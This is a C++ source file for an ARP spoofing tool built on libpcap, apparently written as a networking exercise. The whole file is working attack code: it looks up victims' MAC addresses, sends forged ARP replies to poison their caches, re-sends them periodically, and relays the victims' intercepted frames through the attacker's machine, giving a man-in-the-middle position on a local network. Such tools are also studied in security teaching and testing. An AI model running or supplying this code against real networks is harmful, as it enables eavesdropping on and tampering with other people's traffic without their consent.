#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>

#include "ethhdr.h"
#include "arphdr.h"


#define infect_frequency 10


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


pcap_t* handle;


void usage() {
	fprintf(stdout, "syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	fprintf(stdout, "sample: arp-spoof eth0\n");
}


void send_arp(
	Mac eth_dmac, Mac eth_smac, uint16_t arp_op, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip){
	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(arp_op);
	packet.arp_.smac_ = arp_smac;
	packet.arp_.sip_ = arp_sip;
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = arp_tip;
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}


int main(int argc, char* argv[]) {
	if (argc < 4 || argc%2 != 0) {
		usage();
		return -1;
	}


	//pcap handle
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "error: couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}


	//get my Mac & Ip
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if(fd < 0){
		fprintf(stderr, "error: socket()\n");
		return -1;
	}
	
	struct ifreq ifr;
	strncpy(ifr.ifr_name, argv[1], IFNAMSIZ);
	
	int chk = ioctl(fd, SIOCGIFHWADDR, &ifr);	//get my Mac
	if(chk < 0){
		fprintf(stderr, "error: ioctl()\n");
		close(fd);
		return -1;
	}
	Mac my_Mac = Mac((unsigned char*)ifr.ifr_hwaddr.sa_data);
	
	chk = ioctl(fd, SIOCGIFADDR, &ifr);	//get my Ip
	if(chk < 0){
		fprintf(stderr, "error: ioctl()\n");
		close(fd);
		return -1;
	}
	Ip my_Ip=Ip(ntohl(*(uint32_t*)(ifr.ifr_addr.sa_data+2)));
	
	close(fd);
	fprintf(stdout, "success: get my Mac & Ip\n");


	//get Macs
	Mac Macs[100];
	for(int i=2; i<argc; i++) Macs[i] = Mac::nullMac();
	
	for(int i=2; i<argc; i++){	//send arp packet
		send_arp(Mac::broadcastMac(), my_Mac, ArpHdr::Request, my_Mac, htonl(my_Ip), Mac::nullMac(), htonl(Ip(argv[i])));
	}
	
	int count = argc-2;	//receive & parse arp packet
	while(count){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		EthHdr* ether = (EthHdr*)packet;
		if(ether->type_ != htons(EthHdr::Arp)) continue;
		ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
		if(arp->op_ != htons(ArpHdr::Reply)) continue;
		
		for(int i=2; i<argc; i++){
			if(arp->sip_ != htonl(Ip(argv[i])) || Macs[i] != Mac::nullMac()) continue;
			Macs[i] = arp->smac_;
			count--;
			break;
		}
	}
	fprintf(stdout, "success: get senders' Mac\n");
	
	
	//infect senders
	for(int i=2; i<argc; i+=2){	//send arp packet
		send_arp(Macs[i], my_Mac, ArpHdr::Reply, my_Mac, htonl(Ip(argv[i+1])), Macs[i], htonl(Ip(argv[i])));
	}
	
	
	//relay packet
	int cnt = infect_frequency;
	while(1){
		if(cnt==0){	//infect senders periodically
			for(int i=2; i<argc; i+=2){
				send_arp(Macs[i], my_Mac, ArpHdr::Reply, my_Mac, htonl(Ip(argv[i+1])), Macs[i], htonl(Ip(argv[i])));
			}
			cnt = infect_frequency;
			fprintf(stdout, "send: periodical arp\n");
		}
		cnt--;
	
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		EthHdr* ether = (EthHdr*)packet;
		if(ether->type_ == htons(EthHdr::Arp)){	//reply to arp request
			ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
			if(arp->op_ == htons(ArpHdr::Request)){
				send_arp(ether->smac_, my_Mac, ArpHdr::Reply, my_Mac, arp->tip_, arp->smac_, arp->sip_);
				fprintf(stdout, "send: reply to arp request\n");
			}
		}
		else{	//check src mac and relay packet
			for(int i=2; i<argc; i+=2){
				if(ether->smac_ == Macs[i]){
					fprintf(stdout, "send: relay %s to %s\n", argv[i], argv[i+1]);
					ether->smac_ = my_Mac;
					ether->dmac_ = Macs[i+1];
					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), header->caplen);
					if (res != 0) {
						fprintf(stderr, "error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					}
					break;
				}
			}
		}
	}
	
	pcap_close(handle);
}
